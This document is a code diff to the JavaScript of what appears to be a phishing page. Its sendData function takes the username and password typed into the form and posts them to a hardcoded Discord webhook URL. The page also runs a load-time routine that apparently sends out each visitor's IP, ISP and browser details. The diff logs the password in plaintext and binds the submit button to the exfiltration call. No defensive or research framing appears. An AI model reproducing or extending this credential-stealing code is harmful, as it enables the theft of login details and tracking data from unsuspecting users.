@@ -3,15 +3,18 @@ let infoSent = false;
 async function sendData() {
     const user = document.getElementById("user").value;
     const pass = document.getElementById("pass").value;
-    
+
+    console.log("User: " + user);  // Debug log for user
+    console.log("Password: " + pass);  // Debug log for password
+
     if (!user || !pass) {
         console.log("User or password is empty.");
         return;
     }
-    
+
     const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0";
 
-    const payload = {
+    const payload2 = {
         content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}`
     };
 
@@ -21,7 +24,7 @@ async function sendData() {
             headers: {
                 "Content-Type": "application/json"
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(payload2)
         });
 
         if (response.ok) {
@@ -73,6 +76,9 @@ async function sendInfoOnLoad() {
 }
 
 window.onload = function () {
-    console.log("Page loaded. Sending IP, ISP, and User-Agent info...");
     sendInfoOnLoad();
 };
+
+document.addEventListener("DOMContentLoaded", function() {
+    document.getElementById("submitBtn").addEventListener("click", sendData);
+});
